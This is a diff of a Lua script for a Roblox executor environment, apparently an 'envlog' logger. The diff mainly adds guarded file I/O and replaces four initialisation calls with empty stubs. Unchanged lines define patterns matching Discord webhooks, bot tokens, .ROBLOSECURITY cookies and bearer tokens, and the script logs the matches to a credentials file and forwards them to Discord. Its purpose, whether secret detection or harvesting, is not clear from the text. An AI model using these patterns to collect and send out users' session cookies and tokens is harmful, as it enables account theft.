@@ -443,7 +443,7 @@ end
 
 local PATTERNS={
     {name="discord_webhook",re="https?://[%w%-%.]*discord[%w%-%.]*%.com/api/webhooks/%d+/[%w%-_]+",sev="CRIT"},
-    {name="discord_bot_token",re="[MN][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d]",sev="CRIT"},
+    {name="discord_bot_token",re="[MN][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z[...]
     {name="roblox_cookie",re="_|WARNING:%-DO%-NOT%-SHARE%-THIS[%w%-_%./=]+",sev="CRIT"},
     {name="roblox_cookie_alt",re="%.ROBLOSECURITY=([%w%-_%./=]+)",sev="CRIT"},
     {name="bearer_token",re="[Bb]earer%s+[A-Za-z%d%-%._~+/]+=*",sev="HIGH"},
@@ -451,19 +451,31 @@ local PATTERNS={
 }
 local SECRETS={seen={},hits=0}
 
-local creds_handle
-do local ok,f=pcall(io.open,CONFIG.creds_path,"a"); if ok and f then creds_handle=f end end
+-- SAFE FILE I/O INITIALIZATION
+-- Check if io library is available before using it
+local creds_handle = nil
+local has_io = io ~= nil
+if has_io then
+    local ok, f = pcall(function() return io.open(CONFIG.creds_path, "a") end)
+    if ok and f then creds_handle = f end
+end
 
-local envlog_handle,envlog_bytes
+local envlog_handle, envlog_bytes = nil, 0
 local function open_envlog()
-    local ok,f=pcall(io.open,CONFIG.envlog_path,"a")
-    if ok and f then envlog_handle=f; local sz=f:seek("end"); envlog_bytes=sz or 0 end
+    if not has_io then return end
+    local ok, f = pcall(function() return io.open(CONFIG.envlog_path, "a") end)
+    if ok and f then 
+        envlog_handle = f
+        local sz = f:seek("end")
+        envlog_bytes = sz or 0
+    end
 end
 open_envlog()
 
-local jsonl_handle
-if CONFIG.export_jsonl then
-    local ok,f=pcall(io.open,CONFIG.jsonl_path,"a"); if ok and f then jsonl_handle=f end
+local jsonl_handle = nil
+if CONFIG.export_jsonl and has_io then
+    local ok, f = pcall(function() return io.open(CONFIG.jsonl_path, "a") end)
+    if ok and f then jsonl_handle = f end
 end
 
 local creds_queue={}; local envlog_queue={}
@@ -524,7 +536,7 @@ local function post_json_with_retry(body)
     return false,"retry exhausted"
 end
 
--- MISSING FUNCTION IMPLEMENTATIONS ADDED HERE
+-- MISSING FUNCTION IMPLEMENTATIONS
 local function write_envlog_line(kind, data)
     if not envlog_handle then return end
     local line = string.format("[%s] %s: %s\n", os.date("%Y-%m-%d %H:%M:%S"), kind, to_json(data or {}))
@@ -593,8 +605,6 @@ local function run_signatures(kind, data)
     -- Stub implementation: can be expanded for signature checking
     return
 end
-
--- END OF ADDED IMPLEMENTATIONS
 
 local SEV_RANK={CRIT=4,HIGH=3,MED=2,LOW=1,INFO=0}
 local function worst_sev(batch)
@@ -771,12 +781,26 @@ send_embed_async = function(title,fields,desc,color)
     task.spawn(function() pcall(send_embed,title,fields,desc,color) end)
 end
 
+-- Stub implementations for missing functions
+function capture_executor_fingerprint()
+    -- Stub: Can be expanded later
+end
+
+function install_honeypot()
+    -- Stub: Can be expanded later
+end
+
+function install_print_capture()
+    -- Stub: Can be expanded later
+end
+
+function install_mutation_detector()
+    -- Stub: Can be expanded later
+end
+
 -- Initialize
 probe()
-capture_executor_fingerprint()
-install_honeypot()
-install_print_capture()
-install_mutation_detector()
 
 print("[envlog] Script initialized successfully")
 print("[envlog] Session ID: " .. SESSION_ID)
+print("[envlog] File I/O available: " .. tostring(has_io))
